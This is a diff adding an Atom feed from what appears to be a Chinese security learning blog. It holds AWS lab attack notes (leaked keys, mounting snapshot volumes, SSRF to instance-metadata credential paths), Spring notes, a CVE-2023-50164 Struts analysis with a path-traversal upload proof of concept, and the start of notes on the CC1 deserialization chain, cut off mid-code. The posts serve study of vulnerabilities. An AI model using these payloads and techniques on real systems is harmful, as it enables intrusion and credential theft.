@@ -1,0 +1,2286 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://1dayluo.github.io</id>
+    <title>持剑</title>
+    <updated>2024-03-24T12:52:37.583Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://1dayluo.github.io"/>
+    <link rel="self" href="https://1dayluo.github.io/atom.xml"/>
+    <subtitle>碎月星辰揽江风 , 我心有剑问天涯 </subtitle>
+    <logo>https://1dayluo.github.io/images/avatar.png</logo>
+    <icon>https://1dayluo.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, 持剑</rights>
+    <entry>
+        <title type="html"><![CDATA[AWS 常见安全问题总结（一）]]></title>
+        <id>https://1dayluo.github.io/post/aws-chang-jian-an-quan-wen-ti-zong-jie-yi/</id>
+        <link href="https://1dayluo.github.io/post/aws-chang-jian-an-quan-wen-ti-zong-jie-yi/">
+        </link>
+        <updated>2024-03-24T12:18:36.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="s3常见的安全问题">S3常见的安全问题</h2>
+<h3 id="安全问题概括">安全问题概括</h3>
+<p>概括如下：</p>
+<ol>
+<li>s3桶名为全局变量，默认是aws上任意两个用户不能有重名s3桶变量名。如一域名负载在s3，则可以通过 <code>&lt;s3-name&gt;.&lt;hostname&gt;</code> 访问</li>
+<li>S3配置IAM下， <code>Everyone</code> 意味着所有互联网上所有人。而不是，自己aws账户下的所有人，此外还有 <code>Any Authenticated AWS User</code> ，意味着所有有aws账户的人。后者web页面不支持，但是仍然可以通过SDK和第三方工具配置。</li>
+</ol>
+<h3 id="命令cheatsheet">命令cheatsheet</h3>
+<ol>
+<li>aws同步下载文件到本地</li>
+</ol>
+<pre><code class="language-bash">aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/ . --no-sign-request --region us-west-2
+</code></pre>
+<ol>
+<li>配置新的access_key 和 secret_access_key (以靶场flaws的level3为例子）</li>
+</ol>
+<pre><code class="language-bash">aws configure --profile flawslevel3
+</code></pre>
+<p>查看对应的profile下的资产内容</p>
+<pre><code class="language-bash"> aws s3 ls --profile flawslevel3
+</code></pre>
+<h2 id="ec2常见安全问题">EC2常见安全问题</h2>
+<p>常见概念：</p>
+<ul>
+<li>STS(Security Token Service) ：控制不同aws的安全控制
+<ul>
+<li>GetCallerIdentity: 显示账户可被控制的api <strong>这个操作不需要任何权限</strong>，即使管理员将拒绝访问：  <code>aws sts get-caller-identity --profile flawslevel3</code></li>
+</ul>
+</li>
+<li>snapshot 快照：快照是 Amazon 特有的东西，可让您在帐户之间传输卷上的数据。它们是从卷（volume）创建的“只读”备份</li>
+<li>aws_session_token： 除了<code>access_key</code> 和 <code>secret_access_key</code> 会泄漏外，也有token泄漏的场景。需要一并加入到~/.aws/credentials下，添加 <code>aws_session_token = ..</code></li>
+</ul>
+<h3 id="安全问题概述">安全问题概述：</h3>
+<ol>
+<li>泄漏 <code>access_key</code> 和 <code>secret_access_key</code>, 利用方式，通过aws cli进一步获取更多信息和提权。</li>
+<li>快照记录了volume的信息，并且可以绕过ec2密码，来利用快照访问ec2示例。这就导致了黑客可以利用快照来获取volume信息，并结合aws创建volumn的权限（<code>createVolumePermission</code>） 将受害者volume挂载到攻击者的EC2示例上（需要确保region一致）。从而获取到ec2上的内容。（需要结合第1点来利用）</li>
+<li>ssrf漏洞，导致可以利用 <code>169.254.169.254</code> 获取meta-data。（AWS在IMDSv2下，设立了特定的header，但IMDSv2并非默认强制）关于IMDSv1的问题看这篇<a href="https://kishoreramk.medium.com/securing-aws-understanding-ec2-imds-vulnerabilities-and-learning-from-the-capital-one-breach-6f753e06cd66">文章</a>
+<ol>
+<li>169.254.169.254/latest/meta-data/iam/security-credentials/flaws</li>
+<li>169.254.169.254/latest/meta-data/iam/info</li>
+<li>169.254.169.254/latest/meta-data/iam/</li>
+</ol>
+</li>
+<li><code>SecurityAudit</code> 权限</li>
+</ol>
+<h3 id="cheatsheet">cheatsheet</h3>
+<ol>
+<li>显示全部STS（Security Token Service)</li>
+</ol>
+<pre><code class="language-bash">aws sts get-caller-identity --profile flawslevel3 
+</code></pre>
+<ol>
+<li>显示ec2实例密钥对（需要提前profile配好region）</li>
+</ol>
+<pre><code class="language-bash">aws  --profile flawslevel3 ec2  describe-key-pairs
+</code></pre>
+<ol>
+<li>检查属于用户id为指定id(这里为975426262029）下的快照</li>
+</ol>
+<pre><code class="language-bash">aws ec2 describe-snapshots --owner-id 975426262029 --profile flawslevel3
+</code></pre>
+<ol>
+<li>查看指定快照id的 <code>createVolumePermission</code> 权限</li>
+</ol>
+<pre><code class="language-bash">aws ec2 describe-snapshot-attribute --snapshot-id snap-0b49342abd1bdcb89 --attribute createVolumePermission --profile flawslevel3
+</code></pre>
+<ol>
+<li>volume绑定ec2 instance &amp; 进一步的利用</li>
+</ol>
+<pre><code class="language-bash">aws ec2 attach-volume —-volume-id vol-randnum --instance-id i-randnum —-device /dev/sdf —-region us-west-2
+</code></pre>
+<p>进一步利用所需命令补充（待后续优化笔记）：</p>
+<p>Download the key pair and SSH into it. change the permission of downloaded pem file. <code>ssh -i YOUR_KEY.pem ubuntu@ec2-54-191-240-80.us-west-2.compute.amazonaws.com</code></p>
+<p>First list information about all available block devices using <code>lsblk.</code> <code>xvda1</code> is our available volume.</p>
+<p>view drive information: <code>sudo file -s /dev/xvdf1</code></p>
+<p>Mount drive: <code>sudo mount /dev/xvdf1 /mnt</code></p>
+<h2 id="iam常见安全问题">IAM常见安全问题</h2>
+<ol>
+<li><code>SecurityAudit</code> 的policy能够帮助黑客去读区你或别的iam信息，然后寻找薄弱点</li>
+</ol>
+<h3 id="cheatsheet-2">cheatsheet</h3>
+<p>policy精确查询：</p>
+<p>列出当前用户iam信息：创建时间，路径，unique id，arn</p>
+<pre><code class="language-bash">aws --profile level6 iam get-user
+</code></pre>
+<p>List attached-user-policies attached to user ( <code>{username}</code> 为get-user获取到的用户名）</p>
+<pre><code class="language-bash">aws --profile level6 iam list-attached-user-policies --username {username}
+</code></pre>
+<p>list-users</p>
+<pre><code class="language-bash">aws iam list-users --profile level6
+</code></pre>
+<p>list policies（这里会有arn的信息）</p>
+<pre><code class="language-bash">aws iam list-policies --profile level6
+</code></pre>
+<p>根据arn信息和version id，来查看具体policy信息 （这里arn-id为list-attached-user-policies命令下的）</p>
+<pre><code class="language-bash">aws --profile level6 iam get-policy-version --policy-arn {arn-id} --version-id v4
+</code></pre>
+<p>lambda的精确查询：</p>
+<p>查找有哪些lambda 这一步可以获取到lambda函数名</p>
+<pre><code class="language-bash">aws --region us-west-2 --profile level6 list-funtions
+</code></pre>
+<p>查看对应函数名的policy信息</p>
+<pre><code class="language-bash">aws --region us-west-2 --profile level6 lambda get-policy --function-name {func-name}
+</code></pre>
+<p>这一步可以获取到rest-api-id ，然后访问 <a href="https://api-id.execute-api.us-east-2.amazonaws.com/"><code>https://api-id.execute-api.us-east-2.amazonaws.com</code></a></p>
+<h2 id="学习文章">学习文章：</h2>
+<ul>
+<li><a href="https://kishoreramk.medium.com/hacking-aws-flaws-cloud-walkthrough-2f13083b0b4d">https://kishoreramk.medium.com/hacking-aws-flaws-cloud-walkthrough-2f13083b0b4d</a></li>
+<li><a href="https://kishoreramk.medium.com/securing-aws-understanding-ec2-imds-vulnerabilities-and-learning-from-the-capital-one-breach-6f753e06cd66">https://kishoreramk.medium.com/securing-aws-understanding-ec2-imds-vulnerabilities-and-learning-from-the-capital-one-breach-6f753e06cd66</a></li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[spring 基础概念笔记]]></title>
+        <id>https://1dayluo.github.io/post/spring-ji-chu-gai-nian-bi-ji/</id>
+        <link href="https://1dayluo.github.io/post/spring-ji-chu-gai-nian-bi-ji/">
+        </link>
+        <updated>2024-01-09T13:46:37.000Z</updated>
+        <content type="html"><![CDATA[<p>基于廖雪峰老师网站所做的java学习笔记。为了快速审计java代码，而非开发~</p>
+<h2 id="ioc">IOC</h2>
+<p><strong>Ioc容器</strong>，负责把一些service和datasource包装起来，并且管理创建和销毁</p>
+<p><strong>Bean</strong>， 一些service，例如用户注册，登陆，邮箱发送。。。这些会反复用到的.定义用[Annotation]((<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1282382596407330">https://www.liaoxuefeng.com/wiki/1252599548343744/1282382596407330</a>)，即<code>@Component</code> 注解的方式, 和 <code>@Autowired</code>注解，将指定Bean注入到指定字段中。其他注解：</p>
+<ul>
+<li><code>@Configuration</code> : 配置类，包括创建第三方Bean</li>
+<li><code>@ComponentScan</code>： 配置类同时会用这个Annotation，用于自动搜索当前类所在的包以及子包，把所有标注为<code>@Component</code>的Bean自动创建出来，并根据<code>@Autowired</code>进行装配。</li>
+<li>@Autowired(required = false) 注入Bean，但如果没有则忽略</li>
+<li><code>@PostConstruct</code>和<code>@PreDestroy</code> ： Bean的垃圾清理机制，对清理方法标记</li>
+</ul>
+<p>Bean系统中一个数据库事务中被调用，则使用 <code>@Transactional</code> 注解<br>
+除此之外，还有<code>Prototype</code>的Bean，需要 <code>@Scope</code>注解，第三方Bean，则需要 <code>@Bean</code><br>
+注解。<br>
+<strong>注入配置(<code>.properties</code>文件)：</strong><br>
+注入方法1: 使用 <code>@PropertySource</code>注解（例如<code>@PropertySource(&quot;app.properties&quot;))，在</code>@Configuration`配置类上加注解。</p>
+<pre><code class="language-java">@Value(&quot;${smtp.port:25}&quot;)
+    private int port;
+
+</code></pre>
+<p>上述，<code>@Value(&quot;${smtp.port:25}&quot;)</code> 的用法为读取<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1282383225552930">默认值</a>。<br>
+注入方法2: 在Bean上直接用 <code>@Value(&quot;${smtp.port:25}&quot;)</code> , 然后，也可以用 <code>@Value(&quot;#{smtpConfig.host}&quot;)</code>读取Bean下的host值（没有注解的变量也可以）。<code>#{}</code>表示从JavaBean读取属性<br>
+此外，java分不同的环境，例如开发（native/dev），测试（test），生产（prod），则需要用条件装配：</p>
+<pre><code class="language-java">@Configuration
+@ComponentScan
+public class AppConfig {
+    @Bean
+    @Profile(&quot;!test&quot;)
+    ZoneId createZoneId() {
+        return ZoneId.systemDefault();
+    }
+
+    @Bean
+    @Profile(&quot;test&quot;)
+    ZoneId createZoneIdForTest() {
+        return ZoneId.of(&quot;America/New_York&quot;);
+    }
+}
+
+</code></pre>
+<p>除此之外，还可以用 <code>@Conditional</code> 决定是否创建某个Bean， 案例见<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/13080438746644820">这个</a>，还有：</p>
+<ul>
+<li><code>@ConditionalOnProperty(name=&quot;app.smtp&quot;, havingValue=&quot;true&quot;)</code></li>
+<li><code>@ConditionalOnClass(name = &quot;javax.mail.Transport&quot;)</code></li>
+</ul>
+<h2 id="aop">AOP</h2>
+<p>AOP包括以下概念：</p>
+<ul>
+<li>Aspect：切面，即一个横跨多个核心逻辑的功能，或者称之为系统关注点；</li>
+<li>Joinpoint：连接点，即定义在应用程序流程的何处插入切面的执行；</li>
+<li>Pointcut：切入点，即一组连接点的集合；</li>
+<li>Advice：增强，指特定连接点上执行的动作；</li>
+<li>Introduction：引介，指为一个已有的Java对象动态地增加新的接口；</li>
+<li>Weaving：织入，指将切面整合到程序的执行流程中；</li>
+<li>Interceptor：拦截器，是一种实现增强的方式；</li>
+<li>Target Object：目标对象，即真正执行业务的核心逻辑对象；</li>
+<li>AOP Proxy：AOP代理，是客户端持有的增强后的对象引用。<br>
+通过AOP可以将指定的方法装配到指定Bean的前后</li>
+</ul>
+<p>Aspect相关注解/拦截器类型<br>
+拦截器：</p>
+<ul>
+<li><code>@Aspect</code> : 表明是一个Aspect</li>
+<li><code>@Before</code>： 标注的方法在注入到指定Service的每个public方法执行前</li>
+<li><code>@Around</code> ： 标注的方法在注入到指定Service的每个public方法执行后</li>
+</ul>
+<p>案例还是看<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1310052352786466">教程</a>写的<br>
+同时，例如于配置的类，需要加注解 <code>@EnableAspectJAutoProxy</code> 表示自动查找Aspect的Bean<br>
+另外这里还可以自定义注解, 任何有@MetricTIme注解的方法， 则调用 <code>metric()</code> 方法:</p>
+<pre><code class="language-java">@Aspect
+@Component
+public class MetricAspect {
+    @Around(&quot;@annotation(metricTime)&quot;)
+    public Object metric(ProceedingJoinPoint joinPoint, MetricTime metricTime) throws Throwable {
+        String name = metricTime.value();
+        long start = System.currentTimeMillis();
+        try {
+            return joinPoint.proceed();
+        } finally {
+            long t = System.currentTimeMillis() - start;
+            // 写入日志或发送至JMX:
+            System.err.println(&quot;[Metrics] &quot; + name + &quot;: &quot; + t + &quot;ms&quot;);
+        }
+    }
+}
+
+</code></pre>
+<h3 id="数据库">数据库</h3>
+<p><strong>jdbc</strong><br>
+spring提供了使用jdbc访问数据库的方法，例如用 <code>@PropertySource(&quot;jdbc.properties&quot;)</code> 读取数据库配置文件，同样也是加载配置类上的。spring还提供了 JdbcTemplate的方式：</p>
+<pre><code class="language-java">return jdbcTemplate.execute((Connection conn) -&gt; {
+
+	// ...
+}
+return jdbcTemplate.execute(&quot;SELECT * FROM users WHERE name = ?&quot;, (PreparedStatement ps) -&gt; {
+	// ...
+}
+
+</code></pre>
+<p>更多的jdbcTemplate的数据库查询案例见<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1282383699509281">原文</a></p>
+<p><strong>事务</strong><br>
+spring为了同时支持jdbc和jta（分布式）两种事务类型，抽象出 <code>PlatformTransactionManager</code>, 除了在配置类下，定义出<code>PlatformTransactionManger</code>外，还要加 <code>@EnableTransactionManagement</code> 用于支持声明式事务。<br>
+使用到事务的方法，则加一个 <code>@Transactional</code>注解 / 或加在类上，表示任何public方法都支持事务</p>
+<ul>
+<li>需要回滚的事务注解：<code>@Transactional(rollbackFor = {RuntimeException.class, IOException.class})</code></li>
+<li>复杂的事务场景：需要定义事务传播模型</li>
+</ul>
+<p><strong>集成Hibernate</strong><br>
+实现orm到java对象互换</p>
+<p><strong>JPA</strong><br>
+一个ORM标准，但只是提供接口，依旧需要一些”实现“，例如Hibernate就是JPA的实现</p>
+<p>Hibernate和JPA需要用到<code>SessionFactory</code>与<code>EntityManagerFactory</code></p>
+<p><strong>Proxy模式</strong><br>
+为了获取Bean的更改及时同步到数据库，需要创建代理类。例如一些实现用户注册，登陆的User类，让UserProxy继承User类，同时这个代理类必须保持session，事务提交session关闭。但，为了关闭后，依旧获取事务一致的数据，引入了Attached/Datached状态，用于记录Bean是否在session范围内。<br>
+ORM还提供了多级缓存，用于多次查询返回同一实例</p>
+<p><strong>全自动ORM/半自动ORM</strong></p>
+<p>全自动ORM相对于jdbcTemplate有以下差别：</p>
+<ol>
+<li>查询后需要手动提供Mapper实例以便把ResultSet的每一行变为Java对象；</li>
+<li>增删改操作所需的参数列表，需要手动传入，即把User实例变为[<a href="http://user.id/">user.id</a>, <a href="http://user.name/">user.name</a>, user.email]这样的列表，比较麻烦。<br>
+jdbcTemplate有确定性，缺点是代码繁琐，ORM则有多个缓存，在二级缓存增大了数据的不一致性，可能会意外更新。所以产生了半自动ORM<br>
+半自动ORM框架常见的就是MyBatis，</li>
+</ol>
+<p><strong>MyBaitis</strong><br>
+需要创建 <code>SqlSessionFactoryBean</code></p>
+<pre><code class="language-java">@Bean
+SqlSessionFactoryBean createSqlSessionFactoryBean(@Autowired DataSource dataSource) {
+    var sqlSessionFactoryBean = new SqlSessionFactoryBean();
+    sqlSessionFactoryBean.setDataSource(dataSource);
+    return sqlSessionFactoryBean;
+}```
+另外，Mybatis使用Mapper来实现映射，且Mapper必须是接口。例如
+```java
+public interface UserMapper {
+	@Select(&quot;SELECT * FROM users WHERE id = #{id}&quot;)
+	User getById(@Param(&quot;id&quot;) long id);
+}
+</code></pre>
+<p>如果插入不需要传入 <code>id</code> 但是需要获取插入后的主键，需要加 <code>@Options</code>注解。<br>
+使用 <code>@MapperScan</code>自动创建Mapper实现类，将多个不同的Mapper接口自动创建接口实现。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2023-50164 漏洞分析与学习]]></title>
+        <id>https://1dayluo.github.io/post/cve-2023-50164-lou-dong-fen-xi-yu-xue-xi/</id>
+        <link href="https://1dayluo.github.io/post/cve-2023-50164-lou-dong-fen-xi-yu-xue-xi/">
+        </link>
+        <updated>2023-12-25T16:07:30.000Z</updated>
+        <content type="html"><![CDATA[<p>官方的主要修复有：</p>
+<ul>
+<li><strong><a href="https://github.com/apache/struts/commit/d8c69691ef1d15e76a5f4fcf33039316da2340b6">Makes HttpParameters case-insensitive</a></strong></li>
+</ul>
+<p>感觉有些点还没有细跟 比如ognl的部分，还有这部分的细节。先把学习了大佬们的博文后自己调了一遍+捋思维的过程记录下来吧。</p>
+<p>根据测试用例来看, 之前的问题是大小写不敏感，是 <code>HttpParameters</code>类对新参数的处理出现了问题。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225.png" alt="20231225" loading="lazy"></figure>
+<p>这里的分析思路学习的是 <a href="https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)">trganda博客的思路</a>：</p>
+<p>测试用例 → 定位类下某个方法( appendAll) → appendAll方法调用处 → 从调用处的几个函数中寻找可利用点，即文件上传。</p>
+<p>其中appendAll方法调用处 有一处是涉及文件上传的， 这部分对应的是 <code>FileUploadInterceptor</code> 下的<code>intercept</code> 方法</p>
+<pre><code class="language-java">if (files != null &amp;&amp; files.length &gt; 0) {
+                        List&lt;UploadedFile&gt; acceptedFiles = new ArrayList&lt;&gt;(files.length);
+                        List&lt;String&gt; acceptedContentTypes = new ArrayList&lt;&gt;(files.length);
+                        List&lt;String&gt; acceptedFileNames = new ArrayList&lt;&gt;(files.length);
+                        String contentTypeName = inputName + &quot;ContentType&quot;;
+                        String fileNameName = inputName + &quot;FileName&quot;;
+
+for (int index = 0; index &lt; files.length; index++) {
+                            if (acceptFile(action, files[index], fileName[index], contentType[index], inputName, validation)) {
+                                acceptedFiles.add(files[index]);
+                                acceptedContentTypes.add(contentType[index]);
+                                acceptedFileNames.add(fileName[index]);
+                            }
+                        }
+
+                        if (!acceptedFiles.isEmpty()) {
+                            Map&lt;String, Parameter&gt; newParams = new HashMap&lt;&gt;();
+                            newParams.put(inputName, new Parameter.File(inputName, acceptedFiles.toArray(new UploadedFile[acceptedFiles.size()])));
+                            newParams.put(contentTypeName, new Parameter.File(contentTypeName, acceptedContentTypes.toArray(new String[acceptedContentTypes.size()])));
+                            newParams.put(fileNameName, new Parameter.File(fileNameName, acceptedFileNames.toArray(new String[acceptedFileNames.size()])));
+                            ac.getParameters().appendAll(newParams);
+                        }
+                    }
+</code></pre>
+<p>这里我上传了一个文件 1.txt， 上传的包如图</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_1.png" alt="20231225" loading="lazy"></figure>
+<p>打断点进行代码分析<code>FileUploadInterceptor#intercept</code>， 这里看到， <code>inputName</code> 字段赋值到了两个变量： <code>contentTypeName</code> 和 <code>fileNameName</code> 。 然后这两个变量和 <code>inputName</code> 一同被put到了<code>newParams</code> (类型为Map&lt;String, Parameter&gt; 即 HashMap）</p>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_2.png" alt="20231225" loading="lazy"></figure>
+<p>这里 <code>ac.getParameters().appendAll(newParams);</code> 则是被调用点，ac是一个 <code>ActionInvocation</code></p>
+<pre><code class="language-jsx">ActionContext ac = invocation.getInvocationContext();
+</code></pre>
+<p>这里，作为一枚java小白，恶补一下java知识之关于ActionInvocation的部分</p>
+<blockquote>
+<p>在 Struts 2 框架中，ActionInvocation 是一个核心接口，它代表了一个动作的调用过程。其基本职责是控制动作（action）的执行流程。当一个动作被触发时，ActionInvocation 负责协调 Struts 2 框架各个部分的交互, 包括： 执行拦截器（interceptors）， 调用动作方法，结果处理</p>
+</blockquote>
+<p>现在这个<code>FileUploadInterceptor</code> 类就是一个Interceptors，来处理请求中的各类参数的喵</p>
+<p>这里用户可控的 inputName （对应post传入的name=&quot;upload&quot;;）</p>
+<p>其中， <code>fileName</code> 和 <code>contentType</code> <code>files</code>分别由<code>FileUploadInterceptor#intercept</code> 下列赋值语句获取</p>
+<pre><code class="language-java">String[] fileName = multiWrapper.getFileNames(inputName);
+String[] contentType = multiWrapper.getContentTypes(inputName);
+UploadedFile[] files = multiWrapper.getFiles(inputName);
+</code></pre>
+<p>以下是涉及这几个变量的代码片段截图</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_3.png" alt="20231225" loading="lazy"></figure>
+<p>其中 ``acceptFile` 是检查文件是否合法的（contentType和size两个方面，至于别的检查可以看参考/学习处的文章调试跟进，自己也调试着跟一下，排除了FileUploadInterceptor处的变量覆盖的可能性）这里</p>
+<p><code>multiWrapper.getFileNames(inputName)</code> 跟进是</p>
+<pre><code class="language-java">MultiPartRequestWrapper#getFileNames
+JakartaStreamMultiPartRequest#getFileNames
+AbstractMultiPartRequest#getCanonicalName
+
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_4.png" alt="20231225" loading="lazy"></figure>
+<p>这里限制了文件不能够目录遍历，即直接请求体构造filename是无效的(例如）：</p>
+<pre><code class="language-java">Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;../1.txt&quot;
+</code></pre>
+<p>回到<code>FileUploadInterceptor</code>  继续分析这里用了一个遍历将文件信息放到了都放置到了变量   <code>acceptedFileNames</code>下。然后跟进到 <code>ac.getParameters().appendAll(newParams);</code></p>
+<p>这里 <code>getParameter</code>返回的是一个<code>HttpParameters</code> 类型。这里也没有发现可覆盖点，</p>
+<p>那么在action下的对应函数方法进行断点：</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_5.png" alt="20231225" loading="lazy"></figure>
+<p>看调用栈，这里还能看到ognl</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_6.png" alt="20231225" loading="lazy"></figure>
+<p>同时，IDEA调试知道 <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>  会调用到<code>HttpParameters</code>  （这里ordered为false）</p>
+<pre><code class="language-java">protected void setParameters(final Object action, ValueStack stack, HttpParameters parameters) {
+        HttpParameters params;
+        Map&lt;String, Parameter&gt; acceptableParameters;
+        if (ordered) {
+            params = HttpParameters.create().withComparator(getOrderedComparator()).withParent(parameters).build();
+            acceptableParameters = new TreeMap&lt;&gt;(getOrderedComparator());
+        } else {
+            params = HttpParameters.create().withParent(parameters).build();
+            acceptableParameters = new TreeMap&lt;&gt;();
+        }
+
+		   ......
+			addParametersToContext(ActionContext.getContext(), acceptableParameters);
+    }
+protected void addParametersToContext(ActionContext ac, Map&lt;String, ?&gt; newParams) {
+    }
+</code></pre>
+<p>这里可以看到：</p>
+<p><code>acceptableParameters.put(parameterName, entry.getValue());</code> 是将HashMap数据结构下的元素转到TreeMap元素下，HashMap是无序数据结构，而TreeMap是基于红黑树实现的有序数据结构。</p>
+<p>为了验证实际请求中 顺序产生了改变，这里发起一个构造的name大小写不一样的请求进行测试</p>
+<p>测试的请求1:</p>
+<p>请求内容：</p>
+<pre><code class="language-java">------WebKitFormBoundarylklKBmAwQQCsk4Ex
+Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;fiel1.txt&quot;
+Content-Type: text/plain
+
+test value
+
+------WebKitFormBoundarylklKBmAwQQCsk4Ex
+Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;file2.txt&quot;
+Content-Type: text/plain
+
+file2name
+------WebKitFormBoundarylklKBmAwQQCsk4Ex--
+</code></pre>
+<p>断点： <code>com.opensymphony.xwork2.interceptor.ParametersInterceptor#setParameters</code>  可以看到TreeMap下是大写优先的</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_7.png" alt="20231225" loading="lazy"></figure>
+<p>那么只要不要让传入的参数走<code>FileUploadInterceptor</code>， 就可以摆脱文件上传目录的检查了。</p>
+<p>另外加上通过改变 <code>upload</code> 的值为 uploadFilename 覆盖掉原本的（如图）文件上传目录，因为action的处理过程在<code>FileUploadInterceptor</code>之后。</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_8.png" alt="20231225" loading="lazy"></figure>
+<p>测试poc, poc内容：</p>
+<pre><code class="language-java">------WebKitFormBoundary3ks5NW13KTE8KAzk
+Content-Disposition: form-data; name=&quot;Upload&quot;; filename=&quot;1.txt&quot;
+Content-Type: text/plain
+
+1111
+
+------WebKitFormBoundary3ks5NW13KTE8KAzk
+Content-Disposition: form-data; name=&quot;uploadFileName&quot;; 
+Content-Type: text/plain
+
+../success
+------WebKitFormBoundary3ks5NW13KTE8KAzk--
+</code></pre>
+<p><code>ParametersInterceptor</code>  下断点查看，在 <code>acceptableParameters</code> 下 大写在前</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_9.png" alt="20231225" loading="lazy"></figure>
+<p>这里for循环下打断点也可以看到是在<code>newStack.setParameter</code>   这里设置了action的（还用到了ognl）</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_10.png" alt="20231225" loading="lazy"></figure>
+<p>最后，在循环的最后，uploadFileName 被覆盖</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2023_12/20231225_11.png" alt="20231225" loading="lazy"></figure>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)">https://trganda.github.io/notes/security/vulnerabilities/apache-struts/Apache-Struts-Remote-Code-Execution-Vulnerability-(-S2-066-CVE-2023-50164)</a></li>
+<li><a href="https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/">https://y4tacker.github.io/2023/12/09/year/2023/12/Apache-Struts2-文件上传分析-S2-066/</a></li>
+<li><a href="https://xz.aliyun.com/t/13172">https://xz.aliyun.com/t/13172</a></li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CC1链 学习笔记]]></title>
+        <id>https://1dayluo.github.io/post/cc1-lian-xue-xi-bi-ji/</id>
+        <link href="https://1dayluo.github.io/post/cc1-lian-xue-xi-bi-ji/">
+        </link>
+        <updated>2023-07-11T01:29:59.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="cc1链">CC1链</h1>
+<h2 id="前言">前言</h2>
+<p>大佬们文章很细很全, 为了给自己捋思路…….就比如: 把有疑惑的点反复看,然后在不同的文章里(以及google搜索,补充基础知识etc)找到”为什么这里用XXXX”的原因.</p>
+<p>备注: 参考是自己都看过一遍or多遍的文章, 先学的理论, 实践跟着调试相关的打算后续上传github关于漏洞复现环境(TODO)</p>
+<h3 id="基础">基础</h3>
+<p>CC1(commons-collections3.1-3.2.1) 链下有 <code>Lazymap</code> 和 <code>transformedMap</code> 两条利用链. 这两条都是利用 <code>Annotationinvocation</code> 类来触发的.</p>
+<p>基本环境:</p>
+<ul>
+<li>apache commons-collections3.1-3.2.1</li>
+<li>jdk1.7.1以下</li>
+</ul>
+<p>环境部署maven参考:</p>
+<pre><code class="language-xml">&lt;dependency&gt;
+    &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+    &lt;version&gt;3.1&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<h2 id="利用链核心">利用链核心</h2>
+<p>利用链核心一览(概括)</p>
+<ul>
+<li><code>Constantransformer</code> 类
+<ul>
+<li>初始化 <code>this.iConstant</code></li>
+</ul>
+</li>
+<li><code>InvokerTransformer</code> 类
+<ul>
+<li>初始化 <code>this.iMethodName</code></li>
+</ul>
+</li>
+<li><code>ChainedTransformer</code> 类
+<ul>
+<li><code>transform</code> 方法(public): 反射获取类下方法,并返回invoke(实参)调用结果</li>
+<li>当参数是一个数组时, 对每个参数调用 <code>transform</code> 方法.</li>
+</ul>
+</li>
+</ul>
+<p>以上的类都是对接口 <code>Transformer</code> 接口类的实现,</p>
+<h3 id="constantransformer-类"><code>Constantransformer</code> 类</h3>
+<p>该类方法下有一个 <code>transform</code> 方法,</p>
+<pre><code class="language-java">	public Object transform(object input) { return iConstant;}
+</code></pre>
+<p>无论接受什么对象 都返回 <code>iConstant</code> (对该常量的定义在构造函数内)</p>
+<h3 id="invokertransformer-类"><code>InvokerTransformer</code> 类</h3>
+<p>transform方法代码</p>
+<pre><code class="language-java">public Object transform(Object input) {
+        if (input == null) {
+            return null;
+        } else {
+            try {
+                Class cls = input.getClass();
+                Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
+                return method.invoke(input, this.iArgs);
+            } catch (NoSuchMethodException var5) {
